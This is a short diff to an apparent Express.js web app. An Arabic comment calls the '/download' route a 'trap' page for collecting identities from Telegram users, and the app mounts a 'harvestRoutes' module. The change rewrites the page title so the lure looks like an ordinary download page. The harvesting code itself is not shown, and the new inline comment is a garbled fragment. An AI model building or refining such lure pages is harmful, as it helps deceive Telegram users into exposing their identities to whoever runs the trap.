@@ -45,7 +45,7 @@ app.use('/api', require('./routes/harvestRoutes')); // 👈 أضف هذا الس
 // 👇 صفحة "المصيدة" لجمع الهويات من تيليجرام
 app.get('/download', (req, res) => {
     res.render('download', { 
-        title: 'جاري فحص الرابط...', // العنوان الذي يظهر في المتصفح
+        title: 'Download link is configured  ...', // صفحالعنوان الذي يظهر في المت
         user: req.user || null 
     });
 });
